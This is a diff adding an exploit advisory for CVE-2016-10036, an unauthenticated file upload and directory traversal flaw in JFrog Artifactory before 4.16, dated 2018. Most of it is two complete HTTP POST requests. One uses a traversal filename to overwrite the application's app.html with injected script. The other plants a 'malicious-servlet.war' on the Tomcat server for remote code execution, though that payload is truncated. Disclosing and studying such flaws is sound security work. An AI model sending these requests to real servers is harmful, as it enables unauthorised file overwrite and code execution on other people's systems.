@@ -1,0 +1,108 @@
+# Exploit Title: Jfrog Artifactory < 4.16 - Unauthenticated Arbitrary File Upload / Remote Command Execution
+# Date: 2018-04-25
+# Exploit Author: Alessio Sergi
+# Vendor Homepage: https://jfrog.com/artifactory/
+# Software Link: https://bintray.com/jfrog/artifactory/download_file?file_path=jfrog-artifactory-oss-4.15.0.zip
+# CVE : CVE-2016-10036
+ 
+Jfrog Artifactory < 4.16 is vulnerable to unauthenticated arbitrary file upload and directory traversal vulnerabilities.
+The vulnerabilities are within the upload api "/artifactory/ui/artifact/upload", require that "Allow Anonymous Access" is enabled (as it is on a default installation) and can be abused to create or overwrite files on the server. Specifically, it is possible to create or overwrite any files inside the application folder (scenario 1) or deploy a new application (scenario 2) and execute arbitrary code on the server.
+
+
+Scenario 1: It is possible to modify the html files of the application just by executing an http post request like the one below, which exploits a directory traversal vulnerability on the parameter "filename" to insert the javascript code "<SCRIPT>alert(/Vulnerable/)</SCRIPT>" within the file app.html :
+
+******
+
+POST /artifactory/ui/artifact/upload HTTP/1.1
+Host: [removed]
+User-Agent: [removed]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 1749
+Content-Type: multipart/form-data; boundary=---------------------------6085305491255810029929874687
+Connection: close
+
+-----------------------------6085305491255810029929874687
+Content-Disposition: form-data; name="file"; filename="../../../tomcat/webapps/artifactory/webapp/app.html"
+Content-Type: application/zip
+
+<!DOCTYPE html>
+<html ng-app="artifactory.ui">
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <link rel="icon" type="image/x-icon" href="images/favicon.40350.ico"/>
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="css/vendorStyles.40350.css"/>
+    <link rel="stylesheet" href="css/application.40350.css"/>
+
+    <title></title>
+</head>
+
+<body jf-body-class ng-class="{'load-complete':jfBodyClass.isLoadCompleted()}">
+<jf-spinner domain="body"></jf-spinner>
+<toaster-container></toaster-container>
+
+<ui-view></ui-view>
+
+<!-- Javascript -->
+<script type="text/javascript" src="vendorScripts.40350.js"></script>
+<script type="text/javascript" src="templates.40350.js"></script>
+
+<!-- Application code -->
+<script src="artifactory_core.40350.js"></script>
+<script src="artifactory_services.40350.js"></script>
+<script src="artifactory_dao.40350.js"></script>
+
+<script src="artifactory_ui.40350.js"></script>
+<script src="artifactory_ui_components.40350.js"></script>
+<script src="artifactory_directives.40350.js"></script>
+<script src="artifactory_filters.40350.js"></script>
+
+<script src="artifactory_views.40350.js"></script>
+<script src="artifactory_states.40350.js"></script>
+<script src="artifactory_main.40350.js"></script>
+<SCRIPT>alert(/Vulnerable/)</SCRIPT>
+
+</body>
+</html>
+
+
+-----------------------------6085305491255810029929874687--
+
+******
+
+(It is also possible to exploit this vulnerability to create JSP files within the application folder, but the tomcat used by Artifactory on a default installation won't execute them.) 
+
+
+
+Scenario 2: 
+
+It is possible to exploit the same vulnerability to deploy a malicious servlet application on the tomcat server and obtain remote code execution:
+
+******
+
+POST /artifactory/ui/artifact/upload HTTP/1.1
+Host: [removed]
+User-Agent: [removed]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 3515
+Content-Type: multipart/form-data; boundary=---------------------------6085305491255810029929874687
+Connection: close
+
+-----------------------------6085305491255810029929874687
+Content-Disposition: form-data; name="file"; filename="../../../tomcat/webapps/malicious-servlet.war"
+Content-Type: application/zip
+
+PK��3[--SNIP--]
+WEB-INF/lib/PK������r��>����
+
+-----------------------------6085305491255810029929874687--
+
+******
